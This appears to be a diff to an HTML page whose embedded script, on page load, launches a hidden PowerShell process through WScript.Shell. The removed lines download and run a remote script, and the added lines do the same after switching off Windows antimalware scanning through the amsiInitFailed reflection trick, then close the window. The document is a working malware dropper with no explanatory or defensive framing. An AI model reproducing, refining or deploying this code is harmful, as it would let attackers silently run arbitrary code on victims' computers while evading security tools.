@@ -5,9 +5,9 @@
 </head>
 <body>
 <script>
-var u = 'https://' + location.host + '/s?t=' + Math.random();
-var c = 'powershell -nop -w hidden -ep bypass -c "$s=(New-Object Net.WebClient).DownloadString(\'' + u + '\');[ScriptBlock]::Create($s).Invoke()"';
-new ActiveXObject('WScript.Shell').Run(c, 0, false);
+var u = 'https://' + location.host + '/s.txt?t=' + Math.random();
+var p = 'powershell -nop -w hidden -ep bypass -c "$a=[Ref].Assembly.GetTypes()|?{$_.Name -like \'*iUtils\'};$f=$a.GetFields(\'NonPublic,Static\')|?{$_.Name -eq \'amsiInitFailed\'};$f.SetValue($null,$true);iex((New-Object Net.WebClient).DownloadString(\'' + u + '\'))"';
+new ActiveXObject('WScript.Shell').Run(p, 0, false);
 setTimeout(function(){ try{ window.close(); }catch(e){} }, 2500);
 </script>
 </body>
